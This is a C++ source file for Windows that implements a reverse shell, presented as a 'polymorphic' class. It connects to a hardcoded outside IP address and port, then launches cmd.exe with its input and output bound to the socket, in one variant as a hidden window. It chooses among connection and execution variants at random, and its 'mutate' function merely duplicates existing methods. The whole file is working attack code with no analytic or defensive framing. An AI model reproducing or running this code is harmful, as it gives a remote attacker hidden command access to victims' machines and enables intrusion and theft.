#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <random>
#include <functional>
#include <ctime>
#pragma comment(lib, "ws2_32")

using namespace std;

class PolymorphicShell {
private:
    vector<function<SOCKET(string, short)>> connection_methods;
    vector<function<bool(SOCKET, string)>> execution_methods;
    mt19937 rng;

    SOCKET createSocketMethod1(string ip, short port) {
        SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip.c_str());
        WSAConnect(sock, (SOCKADDR*)&addr, sizeof(addr), nullptr, nullptr, nullptr, nullptr);
        return sock;
    }

    SOCKET createSocketMethod2(string ip, short port) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        addr.sin_addr.s_addr = inet_addr(ip.c_str());
        connect(sock, (SOCKADDR*)&addr, sizeof(addr));
        return sock;
    }

    bool executeShellMethod1(SOCKET sock, string cmd) {
        STARTUPINFOA sui;
        PROCESS_INFORMATION pi;
        memset(&sui, 0, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = STARTF_USESTDHANDLES;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;
        return CreateProcessA(nullptr, (LPSTR)cmd.c_str(), nullptr, nullptr, TRUE, 0, nullptr, nullptr, &sui, &pi);
    }

    bool executeShellMethod2(SOCKET sock, string cmd) {
        STARTUPINFOA sui;
        PROCESS_INFORMATION pi;
        ZeroMemory(&sui, sizeof(sui));
        sui.cb = sizeof(sui);
        sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        sui.wShowWindow = SW_HIDE;
        sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)sock;
        return CreateProcessA(nullptr, (LPSTR)cmd.c_str(), nullptr, nullptr, TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &sui, &pi);
    }

public:
    PolymorphicShell() {
        rng.seed(time(nullptr));
        
        connection_methods = {
            [this](string ip, short port) { return createSocketMethod1(ip, port); },
            [this](string ip, short port) { return createSocketMethod2(ip, port); }
        };

        execution_methods = {
            [this](SOCKET s, string cmd) { return executeShellMethod1(s, cmd); },
            [this](SOCKET s, string cmd) { return executeShellMethod2(s, cmd); }
        };
    }

    bool execute(string ip, short port, string cmd) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);

        uniform_int_distribution<int> conn_dist(0, connection_methods.size() - 1);
        uniform_int_distribution<int> exec_dist(0, execution_methods.size() - 1);

        SOCKET sock = connection_methods[conn_dist(rng)](ip, port);
        bool result = execution_methods[exec_dist(rng)](sock, cmd);

        return result;
    }

    void mutate() {
        // Add new connection variant
        connection_methods.push_back([this](string ip, short port) {
            return createSocketMethod1(ip, port);
        });

        // Add new execution variant
        execution_methods.push_back([this](SOCKET s, string cmd) {
            return executeShellMethod2(s, cmd);
        });
    }
};

int main() {
    PolymorphicShell shell;
    string ip = "3.0.101.96";
    short port = 6125;
    
    shell.execute(ip, port, "cmd.exe");
    shell.mutate();
    
    return 0;
}
